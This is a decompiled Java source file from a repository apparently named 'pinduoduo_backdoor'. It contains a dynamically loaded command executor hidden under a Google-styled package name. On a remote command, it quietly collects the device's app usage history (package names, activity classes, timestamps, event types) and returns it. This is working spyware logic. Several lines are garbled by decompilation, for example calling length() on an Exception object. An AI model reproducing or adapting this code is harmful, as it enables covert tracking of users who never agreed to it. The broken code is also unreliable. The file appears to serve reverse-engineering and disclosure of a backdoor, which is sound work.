package com.google.android.sd.biz_dynamic_dex.usage_event;

import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.util.HashMap;
import org.json.JSONArray;
import org.json.JSONObject;

public class UsageEventExecutor extends DynamicCmdExecutor {
  private int a = 62;
  
  private int b = 0;
  
  private JSONArray a(Context paramContext, long paramLong1, long paramLong2, JSONArray paramJSONArray1, JSONArray paramJSONArray2, JSONArray paramJSONArray3, int paramInt) {
    System.currentTimeMillis();
    UsageEvents usageEvents = ((UsageStatsManager)paramContext.getSystemService("usagestats")).queryEvents(paramLong1, paramLong2);
    JSONArray jSONArray = new JSONArray();
    System.currentTimeMillis();
    String str = "";
    paramLong1 = 0L;
    while (true) {
      if (usageEvents.hasNextEvent()) {
        this.b++;
        if ((paramInt <= 0 || jSONArray.length() < paramInt) && paramLong1 < 819200L) {
          UsageEvents.Event event = new UsageEvents.Event();
          usageEvents.getNextEvent(event);
          if (!TextUtils.equals(event.getPackageName(), str)) {
            str = event.getPackageName();
            if (a(paramContext, paramJSONArray1, paramJSONArray2, str, event.getClassName())) {
              int i = event.getEventType();
              paramLong2 = paramLong1;
              if (a(paramContext, paramJSONArray3, i))
                try {
                  JSONObject jSONObject = new JSONObject();
                  jSONObject.put("pkg", event.getPackageName());
                  jSONObject.put("log_ts", event.getTimeStamp());
                  jSONObject.put("cls", event.getClassName());
                  jSONObject.put("type", i);
                  jSONArray.put(jSONObject);
                  i = (jSONObject.toString().getBytes()).length;
                  paramLong2 = paramLong1 + i;
                } catch (Exception exception) {
                  paramLong2 = paramLong1;
                }  
            } else {
              paramLong2 = paramLong1;
            } 
            paramLong1 = paramLong2;
          } 
          continue;
        } 
      } 
      return jSONArray;
    } 
  }
  
  private void a(Context paramContext, String paramString) {
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    hashMap.put("status", "0");
    hashMap.put("details", paramString);
    TrackUtils.submitTrack(paramContext, this.a, hashMap);
  }
  
  private void a(Context paramContext, JSONObject paramJSONObject, String paramString) {
    String str;
    int i = this.a;
    if (paramJSONObject != null) {
      str = paramJSONObject.optString("uuid");
    } else {
      str = "";
    } 
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(i, str, "client"), paramString, null));
  }
  
  private boolean a(Context paramContext, JSONArray paramJSONArray, int paramInt) {
    if (paramJSONArray == null || paramJSONArray.length() == 0)
      return (paramInt == 1); 
    int i = 0;
    try {
      while (i < paramJSONArray.length()) {
        int j = paramJSONArray.optInt(i);
        if (paramInt == j)
          return true; 
        i++;
      } 
    } catch (Exception exception) {
      a(paramContext, "parse_type_list_error");
    } 
    return false;
  }
  
  private boolean a(Context paramContext, JSONArray paramJSONArray1, JSONArray paramJSONArray2, String paramString1, String paramString2) {
    try {
      if (!a(paramJSONArray2)) {
        if (!a(paramJSONArray1))
          return true; 
      } else {
        if (!a(paramJSONArray2))
          return false; 
        for (int j = 0;; j++) {
          if (j < paramJSONArray2.length()) {
            JSONObject jSONObject = paramJSONArray2.optJSONObject(j);
            if (jSONObject != null) {
              String str = jSONObject.optString("pkg_name");
              if (!TextUtils.isEmpty(str) && str.equals(paramString1)) {
                JSONArray jSONArray = jSONObject.optJSONArray("activity_list");
                if (jSONArray != null) {
                  if (jSONArray.length() == 0)
                    return true; 
                  int k;
                  for (k = 0; k < jSONArray.length(); k++) {
                    str = jSONArray.optString(k);
                    if (!TextUtils.isEmpty(str)) {
                      boolean bool = str.equals(paramString2);
                      if (bool)
                        return true; 
                    } 
                  } 
                } 
              } 
            } 
            continue;
          } 
          return false;
        } 
      } 
    } catch (Exception exception) {
      a(paramContext, "parse_pkg_white_list_error");
      return false;
    } 
    int i;
    for (i = 0; i < exception.length(); i++) {
      String str = exception.optString(i);
      if (!TextUtils.isEmpty(str) && str.equals(paramString1))
        return true; 
    } 
    return false;
  }
  
  private static boolean a(JSONArray paramJSONArray) {
    return (paramJSONArray != null && paramJSONArray.length() > 0);
  }
  
  public void realExecute(Context paramContext, String paramString) {
    Exception exception1;
    System.currentTimeMillis();
    this.b = 0;
    JSONArray jSONArray = null;
    try {
      JSONObject jSONObject = new JSONObject(paramString);
      try {
        long l1 = jSONObject.optLong("beginTime", -1L);
        long l2 = jSONObject.optLong("endTime", -1L);
        JSONArray jSONArray2 = jSONObject.optJSONArray("pkgList");
        JSONArray jSONArray3 = jSONObject.optJSONArray("pkg_list");
        JSONArray jSONArray1 = jSONObject.optJSONArray("typeList");
        jSONArray = jSONObject.optJSONArray("event_list");
        if (jSONArray != null && jSONArray.length() > 0)
          jSONArray1 = jSONArray; 
        int i = jSONObject.optInt("eventCntLimit", -1);
        if (l1 != -1L && l2 != -1L) {
          PackageManager packageManager = paramContext.getPackageManager();
          if (packageManager == null || packageManager.checkPermission("android.permission.PACKAGE_USAGE_STATS", paramContext.getPackageName()) != 0) {
            a(paramContext, "no_package_usage_stats_permission");
            a(paramContext, jSONObject, "not has package_usage_stats permission");
            return;
          } 
          jSONArray1 = a(paramContext, l1, l2, jSONArray2, jSONArray3, jSONArray1, i);
          JSONObject jSONObject1 = new JSONObject();
          jSONObject1.put("seq", jSONArray1);
          CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(new CmdData(this.a, jSONObject.optString("uuid"), "client"), jSONObject1, null));
          return;
        } 
        throw new Exception("invalid input");
      } catch (Exception exception3) {
        JSONObject jSONObject1 = jSONObject;
        exception2 = exception3;
      } 
    } catch (Exception exception2) {
      exception1 = exception3;
    } 
    a(paramContext, exception2.getMessage());
    a(paramContext, (JSONObject)exception1, exception2.getMessage());
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\b50477f70bd14479a50e6fa34e18b2a0-dex2jar.jar!\com\google\android\sd\biz_dynamic_de\\usage_event\UsageEventExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */